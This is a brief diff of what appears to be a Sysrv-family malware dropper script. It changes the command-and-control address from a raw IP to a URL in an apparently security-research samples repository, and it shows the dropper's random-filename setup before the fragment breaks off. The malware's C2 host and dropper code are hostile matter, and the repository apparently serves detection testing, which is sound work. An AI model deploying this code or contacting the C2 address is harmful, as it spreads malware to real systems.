@@ -1,5 +1,5 @@
 export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-cc=http://194.145.227.21
+cc=https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello
 sys=$(date|md5sum|awk -v n="$(date +%s)" '{print substr($1,1,n%7+6)}')
 
 get() {
